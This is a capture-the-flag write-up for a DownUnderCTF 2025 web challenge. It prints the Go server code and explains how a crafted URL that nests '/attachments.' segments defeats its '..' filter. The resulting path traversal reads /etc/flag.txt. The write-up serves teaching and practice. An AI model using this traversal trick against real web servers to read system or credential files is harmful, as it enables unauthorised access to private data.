# secure email attachments — Down under CTF 2025 (OSINT)

[← Back to DUC CTF 2025](../ctf-duc-2025.md)

Category: Web

Points:

Author: MC Fat Monke

## Description

During the email apocalypse, IT admins tried to prevent the DOS of all systems by disallowing attachments to emails. To get around this, users would create their own file storage web servers for hosting their attachments, which also got DOSed because everyone was mass spamming the links in emails...

Can you read /etc/flag.txt from the filesystem?

Handout: [File](https://storage.googleapis.com/downunderctf-2025-noctf-files/noctf-files/u1n0odOzrZIRMtOoedQLj?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=GOOG1ELBSKCSEHWDHBGZCFZBP3RXLJBHVAZJTTYKCMYMRJRM6O5N35G46S26H%2F20250723%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20250723T194000Z&X-Amz-Expires=1200&X-Amz-SignedHeaders=host&X-Amz-Signature=4e42e86f205638a51b6fa6efd9cca96821315f6c7e7fbb985532ddb3ca7b5370)

## Summary and solution

So we get a small go server file, which tries to protect the flag.

```
package main

import (
    "net/http"
    "path/filepath"
    "strings"

    "github.com/gin-gonic/gin"
)

func main() {
    r := gin.Default()

    r.GET("/*path", func(c *gin.Context) {
        p := c.Param("path")
        if strings.Contains(p, "..") {
            c.AbortWithStatus(400)
            c.String(400, "URL path cannot contain \"..\"")
            return
        }
        // Some people were confused and were putting /attachments in the URLs. This fixes that
        cleanPath := filepath.Join("./attachments", filepath.Clean(strings.ReplaceAll(p, "/attachments", "")))
        http.ServeFile(c.Writer, c.Request, cleanPath)
    })

    r.Run("0.0.0.0:1337")
}
```

You have access to everything in the attachment folder, but it will try to remove .. from the routing. 

http://chal.2025.ductf.net:30014/attachments./attachments.//attachments./attachments.//attachments./attachments./etc/flag.txt

By crafting the url as such, we ends up doing a routing like: `../../../etc/flag.txt`

## ✅ Final Flag

    DUCTF{w00000000T!!1one!?!ONE_i_ThORt_tH3_p4RtH_w4R_cL34N!!1??}